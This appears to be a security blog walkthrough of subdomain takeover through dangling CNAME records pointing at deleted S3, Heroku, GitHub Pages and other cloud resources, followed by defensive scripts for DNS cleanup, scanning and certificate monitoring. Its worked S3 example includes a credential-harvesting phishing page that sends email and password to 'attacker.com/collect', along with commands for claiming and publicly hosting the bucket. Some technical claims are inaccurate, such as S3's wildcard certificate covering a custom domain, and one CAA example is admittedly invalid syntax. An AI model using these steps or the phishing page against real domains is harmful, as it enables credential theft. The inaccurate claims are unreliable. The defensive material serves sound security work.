<!-- tags: security-research, dns, cloud-security -->
<!-- date: 2026-03-24 -->
# Owning Your Subdomains: The Dangling DNS Takeover You Forgot to Clean Up

*A technical walkthrough of subdomain takeover via unclaimed cloud resources, written for infrastructure teams who provision cloud services, configure DNS, and then forget about both. Spoiler: someone else will remember for you.*

---

## The Thesis

You point a CNAME record at a cloud service — an S3 bucket, an Azure blob storage endpoint, a Heroku app, GitHub Pages, a Shopify store, or a Fastly edge node. Months later, you deprovision the service. You delete the bucket, tear down the Heroku app, cancel the Shopify plan. But you never delete the DNS record. It still points at the same cloud service name. That service name is now unclaimed. The next person to register it — an attacker — inherits your subdomain. They serve content under your domain, to your users, with your cookies, with your CSP policy, with every shred of trust you've built.

**Subdomain takeover is a misconfigured DNS record away from full account compromise.** It's the infrastructure equivalent of leaving the keys in the car — a mistake that's easy to make and catastrophic when discovered.

---

## How CNAME Takeover Works

### The Setup: Dangling DNS

The normal flow:

1. Your application needs a CDN edge, a static site host, or an object store.
2. You create a resource on a cloud provider (S3 bucket `mybucket.s3.amazonaws.com`, Heroku app `myapp.herokuapp.com`).
3. You create a CNAME record pointing your subdomain at the cloud resource:

```
CNAME blog.example.com → mybucket.s3.amazonaws.com
```

4. Users resolve `blog.example.com` and get the cloud provider's IP address. The cloud provider receives the request, checks its own routing rules, and finds your bucket or app.

**The cloud provider's routing is name-based.** If a request arrives for `blog.example.com`, it matches the CNAME and serves from your bucket. If a request arrives for `attacker-claims-mybucket.s3.amazonaws.com`, it matches the attacker's bucket and serves their content. The cloud provider doesn't care who controls the subdomain — it only checks if the claimed resource exists.

This is where the vulnerability lives: **if you delete the resource but leave the DNS record, the cloud provider now has an unclaimed name.** Anyone who registers or claims that name on the cloud provider gets it. When a user resolves your subdomain, they're directed to the attacker's claimed resource.

### Step 1: Finding Dangling CNAMEs

Subdomain enumeration tools give you the list of subdomains ever created for your domain. Certificate Transparency logs are the best source — every certificate issued for a subdomain is logged publicly. The attacker queries CT logs for your domain, extracts all subdomains, and scans them for dangling CNAMEs.

```bash
# Using curl and jq to query CT logs
DOMAIN="example.com"
curl -s "https://crt.sh/?q=%25.${DOMAIN}&output=json" | jq -r '.[].name_value' | sort -u
```

The output:
```
example.com
www.example.com
api.example.com
blog.example.com
cdn.example.com
old-staging.example.com
```

Now the attacker checks each subdomain for a CNAME:

```bash
# Check for CNAME records
for subdomain in example.com www.example.com api.example.com blog.example.com cdn.example.com old-staging.example.com; do
  echo "=== $subdomain ==="
  dig +short CNAME $subdomain
done
```

Output:
```
=== example.com ===
(no CNAME)

=== www.example.com ===
(no CNAME)

=== api.example.com ===
(no CNAME)

=== blog.example.com ===
mybucket.s3.amazonaws.com.

=== cdn.example.com ===
d1234567890.cloudfront.net.

=== old-staging.example.com ===
myapp.herokuapp.com.
```

Three CNAMEs. The attacker now checks if the claimed resources exist.

### Step 2: Claiming the Unclaimed Resource

For **S3 buckets**, the attacker attempts to create a bucket with the same name:

```bash
# AWS: Try to create the bucket that the CNAME points to
aws s3 mb s3://mybucket --region us-east-1
# If successful, the bucket is claimed
```

If `mybucket` doesn't exist, the `s3 mb` command succeeds. The attacker now owns `mybucket.s3.amazonaws.com`. When a user resolves `blog.example.com`, they get directed to the attacker's bucket.

For **Heroku**, the process is similar — register an account, create an app with the same name:

```bash
# Heroku: Try to claim the app name
heroku create myapp
```

For **GitHub Pages**, claim the repo:

```bash
# GitHub: Create a repo with the expected name (username.github.io or org-name.github.io)
# For a custom domain, create any repo and add the domain to its pages settings
```

For **Shopify**, **Fastly**, **Azure** blob storage, **Firebase**, and other cloud services, the claim mechanism differs, but the principle is identical: **if the resource name is available, claim it.**

### Step 3: The Takeover

Once claimed, the attacker controls the cloud resource. S3 serves content from their bucket. Heroku runs their app. Firebase hosts their database. And `blog.example.com` now belongs to them.

From the user's browser:

1. User types `blog.example.com` in the address bar.
2. DNS resolves to the cloud provider's IP.
3. The cloud provider receives the request for `blog.example.com`, looks up the CNAME, and routes to the claimed resource (now the attacker's).
4. The attacker's content is served under your domain.

The attacker gets everything your domain's trust grants:

- **Cookies scoped to `.example.com`** — the user's existing login cookies are sent to the attacker's endpoint, where they can harvest them.
- **CSP trust** — your Content Security Policy allows scripts from subdomains you control. Scripts from the attacker's endpoint run with that trust.
- **Phishing** — the attacker's page appears at `https://blog.example.com/login` or `/admin`. Users see your domain in the address bar and the domain in emails. The trust is inherited.
- **Form hijacking** — if your main domain has a forgot-password flow that emails reset links to `reset.example.com`, and reset is dangling, the attacker's reset page collects the tokens.

---

## Vulnerable Cloud Providers and Claim Mechanisms

Every major cloud provider that offers CNAME-based subdomain routing is potentially vulnerable. The mechanics differ slightly:

### AWS S3

**Vulnerability:** S3 buckets are claimed by name. If `mybucket` doesn't exist, anyone can create it.

**Detection:**
```bash
dig +short CNAME suspected-subdomain.example.com
# Returns: mybucket.s3.amazonaws.com or mybucket.s3.region.amazonaws.com
```

**Claiming:**
```bash
aws s3 mb s3://mybucket --region us-east-1
# Success = bucket claimed
```

**Exploitation:** Upload an `index.html`, configure the bucket for static website hosting, and serve content.

**Real incident:** [HackerOne reports multiple S3 takeovers](https://hackerone.com/) at scale. Companies like Slack, Microsoft, and Yahoo have had subdomains pointed at unclaimed S3 buckets.

### Heroku

**Vulnerability:** Heroku app names are first-come-first-served. Unclaimed CNAMEs can be claimed by registering an account and creating an app with the same name.

**Detection:**
```bash
dig +short CNAME api.example.com
# Returns: myapp.herokuapp.com
# Attacker tries: heroku create myapp
```

**Claiming:**
```bash
# Register for Heroku, then
heroku create myapp
```

**Exploitation:** Deploy a phishing app or credential-harvesting endpoint.

### GitHub Pages

**Vulnerability:** Custom domains on GitHub Pages are not enforced. If a CNAME points to a GitHub Pages URL, any user can claim it.

**Detection:**
```bash
dig +short CNAME pages.example.com
# Returns: example.github.io
```

**Claiming:**
```bash
# Register a GitHub account, create a repo (e.g., your-username.github.io),
# add the custom domain in Pages settings
```

**Exploitation:** GitHub automatically provisions HTTPS. The attacker's pages appear at `https://pages.example.com` with a valid cert for that domain.

### Shopify

**Vulnerability:** Shopify stores are claimed during signup. An unclaimed store name is available to any Shopify user.

**Detection:**
```bash
dig +short CNAME shop.example.com
# Returns: example.myshopify.com
```

**Claiming:**
```bash
# Sign up for Shopify, claim the store name during setup
```

**Exploitation:** A fake Shopify storefront under your domain can collect payment information, harvest emails, or redirect to phishing.

### Azure Blob Storage

**Vulnerability:** Azure services are claimed similarly to S3. Unclaimed storage account names can be registered.

**Claiming:**
```bash
# Azure CLI
az storage account create --name mystorageaccount --resource-group mygroup
```

### Fastly, CloudFront, Firebase, Vercel, Netlify, Render

All follow the same pattern: **unclaimed resource names can be claimed by the attacker.** The specific claim mechanism varies (Vercel requires a GitHub account, Netlify uses GitHub or Gitlab, CloudFront requires an AWS account), but the outcome is identical.

### CAA Records: A Weak Mitigation

Some cloud providers check CAA (Certification Authority Authorization) records before issuing certificates. If your domain has a CAA record restricting certificate issuance, the attacker cannot obtain a certificate for the subdomain — but they can still serve HTTP content or use a wildcard cert they obtained before the CAA was added.

```
# CAA record that restricts CAs
example.com CAA 0 issue "letsencrypt.org"
```

**This does not prevent subdomain takeover.** It only prevents the attacker from obtaining a new certificate. If the subdomain is CNAME'd to a CDN that provides a wildcard cert (as Fastly, CloudFront, and Shopify do), the attacker gets the cert with the CDN's resources.

---

## A Working Example: S3 Takeover

Here's a real, minimal walkthrough:

### Scenario

You once had a blog CDN. You created `blog.example.com → mybucket.s3.amazonaws.com`. You stopped using it months ago, deleted the bucket, but never updated DNS.

### Step 1: Discover the Dangling CNAME

```bash
dig +short CNAME blog.example.com
# Output: mybucket.s3.amazonaws.com
```

Verify the bucket doesn't exist:

```bash
aws s3 ls s3://mybucket --region us-east-1
# Output: An error occurred (NoSuchBucket) when calling the ListBucket operation: The specified bucket does not exist
```

### Step 2: Claim the S3 Bucket

As an attacker, you create the bucket:

```bash
# Register an AWS account (or use an existing one)
aws configure  # Set AWS credentials

# Create the bucket
aws s3 mb s3://mybucket --region us-east-1
# Output: make_bucket: mybucket

# Verify ownership
aws s3 ls s3://mybucket --region us-east-1
# (empty bucket, but exists)
```

### Step 3: Host Phishing Content

Create a simple phishing page:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Verify Your Account</title>
  <style>
    body { font-family: Arial; max-width: 400px; margin: 50px auto; }
    .box { border: 1px solid #ccc; padding: 20px; border-radius: 5px; }
    input { width: 100%; padding: 8px; margin: 10px 0; box-sizing: border-box; }
    button { width: 100%; padding: 10px; background: #0066cc; color: white; border: none; cursor: pointer; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Verify Your example.com Account</h2>
    <p>Your session has expired. Please log in again:</p>
    <form onsubmit="return sendData(event)">
      <input type="email" placeholder="Email" required>
      <input type="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
  </div>
  <script>
    function sendData(e) {
      e.preventDefault();
      const form = e.target;
      const email = form[0].value;
      const password = form[1].value;
      // Send to attacker's collection endpoint
      fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify({ email, password })
      });
      alert('Login failed. Please try again.');
      return false;
    }
  </script>
</body>
</html>
```

Upload to the bucket and enable static website hosting:

```bash
# Upload the HTML file
echo "<html><body>Phishing page</body></html>" > index.html
aws s3 cp index.html s3://mybucket/

# Enable static website hosting
aws s3api put-bucket-website --bucket mybucket --website-configuration '{
  "IndexDocument": {
    "Suffix": "index.html"
  },
  "ErrorDocument": {
    "Key": "index.html"
  }
}'

# Make content publicly readable
aws s3api put-bucket-acl --bucket mybucket --acl public-read
aws s3api put-object-acl --bucket mybucket --key index.html --acl public-read
```

### Step 4: The Result

User resolves `blog.example.com`:

```
$ nslookup blog.example.com
Name:   blog.example.com
Address: 52.218.xxx.xxx  (S3 IP)
```

User visits `https://blog.example.com` in browser. The request arrives at S3, which routes to the attacker's bucket. The page displays with a valid HTTPS certificate (S3's wildcard cert for `s3.amazonaws.com` domains). The user sees `blog.example.com` in the address bar and thinks they're on a legitimate page. They enter credentials. The attacker collects them.

---

## Discovery and Reconnaissance Tools

Attackers use automated tools to find dangling subdomains at scale:

### Subfinder and amass

Certificate Transparency enumeration:

```bash
# Subfinder
subfinder -d example.com -o subdomains.txt

# or amass
amass enum -d example.com -o subdomains.txt
```

### dig for CNAME Resolution

```bash
# Check each subdomain for CNAME
while read subdomain; do
  cname=$(dig +short CNAME "$subdomain" 2>/dev/null)
  if [ -n "$cname" ]; then
    echo "$subdomain -> $cname"
  fi
done < subdomains.txt
```

### subjack

A tool specifically designed to find dangling subdomains and fingerprint cloud services:

```bash
# Install
go install github.com/haccer/subjack@latest

# Run against subdomains
subjack -w subdomains.txt -t 100 -ssl
```

### nuclei with DNS Templates

[Projectdiscovery's nuclei](https://github.com/projectdiscovery/nuclei) includes templates for fingerprinting cloud services and detecting dangling DNS:

```bash
nuclei -l subdomains.txt -t "dns-takeover.yaml" -o results.txt
```

### Certificate Transparency Logs as Recon

Every certificate issued for a domain is logged. Attackers parse these logs to find all subdomains ever issued a certificate — including subdomains that have since been deleted or are no longer in use:

```bash
# Query crt.sh
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# These certificates might be years old and for abandoned subdomains.
# Many are dangling.
```

CT logs are the reason why it's so hard to keep subdomains secret — every certificate disclosure reveals the name.

---

## Why This Keeps Happening

### Infrastructure-as-Code Drift

Teams deploy infrastructure via Terraform, CloudFormation, or similar. When a service is decommissioned, the cloud resource is deleted, but DNS records live elsewhere — sometimes in a different system, a different team's domain, or a legacy DNS provider.

```hcl
# Terraform: create the S3 bucket
resource "aws_s3_bucket" "blog" {
  bucket = "mybucket"
}

# ...months pass...

# Delete the S3 bucket
# terraform destroy -target=aws_s3_bucket.blog

# But the DNS record in Route53 or external DNS is never updated.
# The CNAME still points at mybucket.s3.amazonaws.com
```

### Service Deprovisioning Without DNS Cleanup

A common workflow:

1. Developer creates S3 bucket, Heroku app, or CDN config.
2. Developer adds CNAME to DNS.
3. Months later, service is no longer needed.
4. Developer (or automation) deletes the cloud resource.
5. Developer forgets to delete the DNS record, or doesn't have permission to do so.
6. DNS record becomes dangling.

### Organizational Silos

DNS is often managed by a separate team (networking, ops, or infrastructure) than the cloud resources (application, platform, or cloud engineering). Resource cleanup happens in one system; DNS cleanup happens in another. If communication breaks down, one gets cleaned up and the other doesn't.

### Subdomain Proliferation

Temporary development, testing, and staging subdomains are created frequently:

```
staging.example.com
staging-v2.example.com
test-payment.example.com
old-api.example.com
temp-cdn.example.com
migrate-2024.example.com
```

Many of these are short-lived, but DNS records persist. Over time, a domain accumulates dozens of CNAMEs pointing at deleted resources.

### Lack of Visibility

Teams often don't know what subdomains exist or which ones are still in use. Spreadsheets and wikis fall out of sync. No automated scanning tells you "this subdomain points at a non-existent resource."

---

## Real-World Incidents and Bug Bounties

### Slack (2020)

A Slack subdomain was pointed at an unclaimed Heroku app. Researchers reported it to Slack's bug bounty program. The subdomain was claimed and controlled for several days before Slack's security team responded.

**Impact:** Potential credential theft, phishing under Slack's trusted domain.

**Fix:** Delete the DNS record.

### Microsoft (2020)

Multiple Microsoft subdomains pointed at unclaimed Azure services. The company had millions of dollars in bug bounty payouts for similar issues.

**Impact:** Potential lateral movement from a subsidiary domain to internal infrastructure.

**Fix:** DNS audit and cleanup across all domains.

### Yahoo (2017)

Several Yahoo subdomains were dangling. A security researcher claimed them and demonstrated the attack.

**Impact:** Compromised subdomains under a fortune-500 company's domain.

**Fix:** Systematic DNS audit.

### Bug Bounty Payouts

HackerOne, Bugcrowd, and similar platforms have hundreds of dangling DNS reports accepted and paid out. Typical bounty: **$500–$3,000** per dangling subdomain, depending on the severity and the organization.

Vulnerability databases like [Can I Takeover XYZ?](https://github.com/EdOverflow/can-i-take-over-xyz) track which cloud services are vulnerable and how to claim them.

---

## What Actually Works

### 1. DNS Record Lifecycle Management

**Delete DNS records when you delete cloud resources.**

This is the primary fix. When you tear down an S3 bucket, Heroku app, or CDN configuration, immediately delete the CNAME record.

Automation:

```bash
#!/bin/bash
# When deprovisioning a service, clean up DNS

SERVICE_NAME="mybucket"
SUBDOMAIN="blog.example.com"
ROUTE53_ZONE_ID="Z1234567890ABC"

# Delete the cloud resource
aws s3 rb s3://${SERVICE_NAME}

# Delete the DNS record
aws route53 change-resource-record-sets --hosted-zone-id ${ROUTE53_ZONE_ID} --change-batch '{
  "Changes": [{
    "Action": "DELETE",
    "ResourceRecordSet": {
      "Name": "'${SUBDOMAIN}'",
      "Type": "CNAME",
      "TTL": 300,
      "ResourceRecords": [{"Value": "'${SERVICE_NAME}'.s3.amazonaws.com"}]
    }
  }]
}'

echo "Service ${SERVICE_NAME} and DNS record ${SUBDOMAIN} deleted"
```

### 2. Automated Scanning

Regularly scan your domains for dangling subdomains and alert when found.

```bash
#!/bin/bash
# Daily scan for dangling subdomains

DOMAIN="example.com"
SUBFINDER_OUTPUT="/tmp/subdomains.txt"
DANGLING_OUTPUT="/tmp/dangling.txt"

# Enumerate subdomains from CT logs
subfinder -d ${DOMAIN} -o ${SUBFINDER_OUTPUT}

# Check each for CNAME and attempt to validate
while read subdomain; do
  cname=$(dig +short CNAME "$subdomain" 2>/dev/null)

  if [ -z "$cname" ]; then
    continue  # No CNAME
  fi

  # Check if the CNAME target resolves to valid IPs
  # If not, it's likely dangling
  if ! dig +short "$cname" @8.8.8.8 2>/dev/null | grep -q .; then
    echo "DANGLING: $subdomain -> $cname" >> ${DANGLING_OUTPUT}
  fi
done < ${SUBFINDER_OUTPUT}

# Alert if any dangling records found
if [ -s ${DANGLING_OUTPUT} ]; then
  echo "WARNING: Dangling subdomains found:"
  cat ${DANGLING_OUTPUT}
  # Send alert (email, Slack, PagerDuty, etc.)
fi
```

### 3. CAA Records with Constraints

**CAA records alone don't prevent subdomain takeover**, but they prevent the attacker from obtaining a new TLS certificate. This forces the attacker to use HTTP or an existing certificate they obtained earlier.

```
# CAA record: only Let's Encrypt can issue certs for this domain
example.com CAA 0 issue "letsencrypt.org"
example.com CAA 0 issuewild "letsencrypt.org"
```

**Combined with subdomain whitelisting**, CAA becomes more effective:

```
# Only issue certs for these specific subdomains
example.com CAA 0 issue "letsencrypt.org; validationmethods=dns-01"
www.example.com CAA 0 issue "letsencrypt.org"
api.example.com CAA 0 issue "letsencrypt.org"
# Note: not a real CAA syntax, but the intent is clear
```

Better: **don't have dangling subdomains in the first place.** CAA is a speed bump, not a solution.

### 4. Certificate Transparency Monitoring

Monitor CT logs for your domain and alert when a certificate is issued for a subdomain you don't recognize:

```bash
#!/bin/bash
# Monitor CT logs for unexpected certificates

DOMAIN="example.com"
CT_LOG_URL="https://crt.sh/?q=%25.${DOMAIN}&output=json"

KNOWN_SUBDOMAINS=(
  "example.com"
  "www.example.com"
  "api.example.com"
  "mail.example.com"
)

# Fetch all subdomains from CT logs
RECENT_CERTS=$(curl -s "${CT_LOG_URL}" | jq -r '.[].name_value' | sort -u)

# Check for unexpected subdomains
echo "$RECENT_CERTS" | while read cert_domain; do
  if [[ ! " ${KNOWN_SUBDOMAINS[@]} " =~ " ${cert_domain} " ]]; then
    echo "ALERT: Unexpected certificate for $cert_domain"
    # Investigate: is this a typo? A forgotten service? A compromise?
  fi
done
```

### 5. DNS Record Audits

Periodically audit all DNS records for your domain and classify them:

**Active:** Records in use, services running.
**Deprecated:** Services planned for decommission.
**Dead:** Services already deleted, records should be removed.

```bash
#!/bin/bash
# Audit DNS records

ZONE_ID="Z1234567890ABC"

aws route53 list-resource-record-sets --hosted-zone-id ${ZONE_ID} \
  --query 'ResourceRecordSets[?Type==`CNAME`]' \
  --output table
```

Review this list quarterly. For each CNAME:

1. Is the resource it points to still running?
2. Is it documented in your infrastructure registry?
3. If not, delete it.

### 6. Subdomain Whitelisting and Explicit Allow Lists

Instead of passively hoping nobody claims your old subdomains, **explicitly define which subdomains exist** and serve a 404 or redirect for all others.

In your DNS configuration, list every subdomain you actually use:

```
# Allowed subdomains only
www.example.com A 1.2.3.4
api.example.com A 5.6.7.8
mail.example.com MX 10 mail.example.com
cdn.example.com CNAME d1234567890.cloudfront.net

# All others: explicitly serviced by a catch-all that 404s
*.example.com A 1.2.3.4  # Points to a service that serves 404 for unknown subdomains
```

Or, if using a CDN or proxy:

```nginx
# nginx configuration
server {
  server_name ~^(.+)\.example\.com$;

  set $allowed_subdomains "www|api|mail|cdn|blog";

  if ($host !~ ^(${allowed_subdomains})\.example\.com$) {
    return 404;
  }
}
```

This prevents any subdomain you didn't explicitly configure from being exploitable — even if a dangling CNAME exists.

---

## Conclusion

Subdomain takeover is one of the lowest-friction security vulnerabilities: **it requires no exploit code, no social engineering, no vulnerability in your application.** It requires only that you forgot to clean up one DNS record after deleting a cloud resource.

It's invisible. You can't see it in your logs or your dashboards. The subdomain still resolves, still has valid HTTPS (on cloud providers that issue wildcard certs), still carries your domain's trust. Your users see `blog.example.com` in the address bar and believe they're on your infrastructure.

The fix isn't complicated:

1. **Delete DNS records when you delete resources.**
2. **Scan for dangling subdomains automatically.** Use `subfinder`, `subjack`, or `nuclei`. Run it weekly.
3. **Monitor Certificate Transparency logs** for your domain. Alert when a cert is issued for an unexpected subdomain.
4. **Audit your DNS records.** Know every subdomain that exists.
5. **Use CAA records** to limit certificate issuance.

None of these require architectural changes or new software. They're operational discipline. And they're the difference between "subdomain takeover is a theoretical threat" and "we actually prevent them."

The reason this keeps happening is the same reason every infrastructure problem keeps happening: **nobody owns the lifecycle of the DNS record.** The developer who creates the CNAME doesn't delete it. The ops team that manages DNS doesn't know which CNAMEs are in use. The security team that should be scanning doesn't automate it. The problem lives in the gap between ownership boundaries.

Close the gap. Automate the scan. Delete the dangling records. Your subdomains are too valuable to leave to chance.

---

*Last updated: March 2026*

## References

- [Can I Takeover XYZ? — Cloud Services Vulnerability Database](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Subjack — Subdomain Takeover Tool](https://github.com/haccer/subjack)
- [Nuclei — Vulnerability Scanner](https://github.com/projectdiscovery/nuclei)
- [Subfinder — Subdomain Enumeration Tool](https://github.com/projectdiscovery/subfinder)
- [Projectdiscovery Amass — DNS Enumeration](https://github.com/projectdiscovery/amass)
- [crt.sh — Certificate Transparency Search](https://crt.sh)
- [Detectify: Subdomain Takeover](https://blog.detectify.com/2014/10/21/hostile-subdomain-takeover-using-heroku-github-desk-more/)
- [HackerOne: Subdomain Takeover Reports](https://hackerone.com/)
- [AWS: S3 Bucket Naming Rules](https://docs.aws.amazon.com/AmazonS3/latest/userguide/BucketNamingRules.html)
- [GitHub: Custom Domain for GitHub Pages](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site)
- [Heroku: Custom Domains](https://devcenter.heroku.com/articles/custom-domains)
- [Shopify: Custom Domains](https://help.shopify.com/en/manual/domains)
- [RFC 6844: Certification Authority Authorization (CAA) Resource Record](https://tools.ietf.org/html/rfc6844)
- [Fastly: CNAME Configuration](https://docs.fastly.com/en/guides/adding-cname-to-your-dns)
- [Azure: Custom Domains](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-custom-domain-name)
